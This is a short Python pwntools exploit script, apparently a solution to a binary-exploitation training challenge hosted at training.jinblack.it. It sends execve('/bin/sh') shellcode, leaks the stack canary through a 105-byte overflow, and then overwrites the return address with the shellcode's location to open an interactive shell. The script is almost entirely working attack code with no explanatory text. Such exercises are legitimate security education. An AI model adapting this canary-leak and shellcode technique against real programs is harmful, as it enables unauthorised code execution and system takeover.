from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']
#ssh = ssh("acidburn", "192.168.56.103")
#r = ssh.process("./leakers")
#gdb.attach(r, """
#	b *0x000401200
#	c
#	""")

r = remote("training.jinblack.it", 2010)

input("wait")

shellcode = b"\xEB\x14\x5F\x48\x89\xFE\x48\x83\xC6\x08\x48\x89\xF2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05\xE8\xE7\xFF\xFF\xFF"
shellcode = shellcode + b"/bin/sh\x00" + b"\x00"*8

r.send(shellcode)
time.sleep(0.1)

r.send("A"*105)
time.sleep(0.1)
r.recvuntil("> ")
r.recv(105)
canary = u64(b"\x00" + r.recv(7))
print("0x%x" % canary)

wheretojump = 0x00404080

payload = b"A" * 104 + p64(canary) + b"B"*8 + p64(wheretojump)

r.send(payload)
time.sleep(0.1)

r.interactive()

